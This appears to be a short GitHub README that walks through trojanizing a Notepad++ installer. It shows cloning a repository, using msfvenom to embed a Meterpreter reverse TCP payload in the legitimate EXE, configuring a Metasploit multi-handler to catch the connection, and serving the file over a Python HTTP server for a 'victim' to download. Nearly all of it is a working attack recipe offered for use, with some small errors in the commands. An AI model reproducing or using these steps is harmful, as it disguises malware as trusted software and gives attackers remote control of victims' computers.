# 👉Create Basic Backdoor & Combine Payload with Legitimate EXE for reverse TCP connection 🔐✔
```
sudo git clone https://github.com/PushMeUp97/CombinePayloadwithLegitimateEXE.git
sudo chmod 777 CombinePayloadwithLegitimateEXE
cd CombinePayloadwithLegitimateEXE
```
# Create simple backdoor using msfvenom
```
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR HOST IP> LPORT=<YOUR HOST PORT> -x npp.8.7.4.Installer.x64.exe -f exe -o Payload_Legit.exe
```
# Configure the Mmlti-handler to catch the reverse connection:

```
msfconsole
```
```use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <YOUR HOST IP>
set LPORT LPORT=<YOUR HOST PORT>
show options
exploit
```
# Hosting Service the current directory to allow victim to download software
```
python3 -m http.server 8000
